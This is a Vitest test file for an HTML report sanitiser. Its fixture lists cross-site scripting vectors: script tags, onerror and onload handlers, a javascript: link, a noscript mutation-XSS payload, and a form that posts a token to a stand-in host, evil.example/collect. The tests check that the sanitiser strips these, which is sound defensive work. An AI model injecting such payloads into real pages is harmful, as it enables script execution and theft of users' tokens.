import { describe, expect, it } from 'vitest';
import { sanitizeReportHtml } from '../sanitize';
import bareAnchorsReport from '../__fixtures__/report-topic-bare-anchors.html?raw';

// A hostile "report": every vector the reader would have been exposed to
// if the iframe's origin isolation were removed without a sanitiser.
const HOSTILE = `
<section class="report">
  <h2 onclick="steal()">Executive <script>alert('h2')</script>Summary</h2>
  <p style="color:red" onmouseover="steal()">Plain <em>prose</em> survives.</p>
  <script>alert('script')</script>
  <style>body { display: none }</style>
  <img src="x" onerror="alert('img')">
  <a href="javascript:alert('js')">javascript link</a>
  <a href="https://www.youtube.com/watch?v=abc123def45&t=42" target="_blank">0:42</a>
  <iframe src="https://evil.example/"></iframe>
  <object data="evil.swf"></object>
  <embed src="evil.swf">
  <form action="https://evil.example/collect"><input name="token"><button>send</button></form>
  <svg onload="alert('svg')"><circle r="1"/></svg>
  <math><mi>x</mi></math>
  <noscript><p title="</noscript><img src=x onerror=alert('mxss')>">n</p></noscript>
  <a href="https://example.test/" data-track="1" title="ok">external</a>
  <table><tr><td>cell</td></tr></table>
</section>`;

describe('sanitizeReportHtml', () => {
  const out = sanitizeReportHtml(HOSTILE);

  it('drops scripts and inline event handlers', () => {
    expect(out).not.toContain('<script');
    expect(out).not.toContain("alert(");
    expect(out).not.toMatch(/\son[a-z]+=/i);
  });

  it('drops javascript: URLs but keeps safe absolute links', () => {
    expect(out).not.toContain('javascript:');
    expect(out).toContain('href="https://www.youtube.com/watch?v=abc123def45&amp;t=42"');
    expect(out).toContain('target="_blank"');
    expect(out).toContain('href="https://example.test/"');
  });

  it('drops the style element, style attributes and data attributes', () => {
    expect(out).not.toContain('<style');
    expect(out).not.toContain('display: none');
    expect(out).not.toContain('style=');
    expect(out).not.toContain('data-track');
  });

  it('drops embedding, form, svg, math and noscript vectors', () => {
    for (const tag of ['<iframe', '<object', '<embed', '<form', '<input', '<button', '<svg', '<math', '<noscript']) {
      expect(out).not.toContain(tag);
    }
  });

  it('keeps the prose and structure the reader needs', () => {
    expect(out).toContain('<h2>Executive Summary</h2>');
    expect(out).toContain('<p>Plain <em>prose</em> survives.</p>');
    expect(out).toContain('<table>');
    expect(out).toContain('<td>cell</td>');
    expect(out).toContain('title="ok"');
  });
});

describe('sanitizeReportHtml on a stored real report', () => {
  const out = sanitizeReportHtml(bareAnchorsReport);

  it('strips the document chrome and the embedded stylesheet', () => {
    expect(bareAnchorsReport).toContain('<style>'); // the fixture really carries one
    expect(out).not.toContain('<style');
    expect(out).not.toContain('box-sizing'); // no CSS text leaks as prose
    expect(out).not.toContain('<title');
    expect(out).not.toContain('<html');
    expect(out).not.toContain('<body');
  });

  it('keeps the written sections', () => {
    expect(out).toContain('<h2>Executive Summary</h2>');
    expect(out).toContain('href="&amp;t=');
  });
});
